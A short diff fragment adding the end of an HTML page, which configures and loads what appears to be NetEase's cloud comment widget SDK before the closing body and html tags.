+        productKey: "1df5358122a34c2ea8ff83d099d7006e",
+        target: "cloud-tie-wrapper"
+      };
+    </script>
+    <script src="https://img1.ws.126.net/f2e/tie/yun/sdk/loader.js"></script>
+  
+
+
+
+
+
+
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+</body>
+</html>
